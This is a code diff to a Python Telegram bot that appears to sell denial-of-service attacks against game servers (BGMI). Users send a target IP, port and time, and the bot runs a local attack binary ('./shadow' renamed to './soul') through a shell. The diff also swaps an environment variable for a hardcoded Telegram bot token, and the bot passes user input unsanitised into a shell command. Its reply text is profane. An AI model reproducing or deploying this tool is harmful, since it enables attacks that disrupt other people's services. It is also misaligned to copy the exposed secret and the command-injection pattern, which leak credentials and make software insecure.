@@ -3,9 +3,7 @@ import subprocess
 import datetime
 import os
 
-#bot = telebot.TeleBot('7824390469:AAG6YaSxzd6gHIl5vA5eBOjUAsByPwPiJ9U')
-TOKEN = os.getenv("soulcracks")
-bot = telebot.TeleBot(TOKEN)
+bot = telebot.TeleBot('7824390469:AAG6YaSxzd6gHIl5vA5eBOjUAsByPwPiJ9U')
 admin_id = ["8024976227","6312238286"]
 USER_FILE = "users.txt"
 
@@ -297,7 +295,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/jonysins', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                full_command = f"./shadow {target} {port} {time}"
+                full_command = f"./soul {target} {port} {time}"
                 process = subprocess.run(full_command, shell=True)
                 response = f"[𝘼𝙩𝙩𝙖𝙘𝙠 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙] 😈BAHAN KE LODE FEEDBACK DEDE AB KYA MA CHUDATA RAHEGA ATTACK LAGA LAGA KE 😈"
         else:
@@ -416,13 +414,4 @@ def welcome_plan(message):
 
     bot.reply_to(message, response)
 
-
-
-
 bot.polling()
-#while True:
- #   try:
-  #      bot.polling(none_stop=True)
-   # except Exception as e:
-    #    print(e)
-
